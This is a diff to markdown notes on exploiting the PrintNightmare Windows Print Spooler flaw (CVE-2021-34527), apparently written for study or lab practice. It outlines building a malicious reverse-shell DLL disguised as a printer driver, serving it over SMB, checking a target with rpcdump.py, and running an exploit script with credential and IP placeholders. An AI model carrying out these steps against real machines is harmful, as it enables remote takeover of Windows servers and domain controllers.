@@ -1,18 +1,18 @@
 # PrintNightmare Windows Print Spooler Vulnerability (CVE2021-34527)
-Ref: https://github.com/m8sec/CVE-2021-34527?tab=readme-ov-file
+Ref: https://thedutchhacker.com/how-to-exploit-the-printnightmare-cve-2021-34527/
 
 ##Pre-exploitation
 
 **Attacker**
 1. Install Impacket and python script to exploit the vulnerability
 2. Install metasploit (if you aren't using Kali), create a malicious dll as a faked printer driver and set up a listener on port 1443
-   Steps to create a reverse shell dll: https://thedutchhacker.com/how-to-exploit-the-printnightmare-cve-2021-34527/
-   
 4. Run SMB server service and modify the config file
 5. Place the faked printer driver to the SMB path
 6. Ensure the target is vulnerable to MS-RPRN (Print System Remote Protocol) by running
    rpcdump.py <username>:<password>:@<target IP addr> | grep MS-RPRN
 7. Exploit the vulnerability to the target machine
+   Download the python script: https://github.com/m8sec/CVE-2021-34527?tab=readme-ov-file
+   
 ```console
    sudo python3 CVE-2021-34527.py -u <username> -p <password> -d <domain controller IP addr> -dll <path/path/to/maliciousdll> <domain IP addr>
 ```
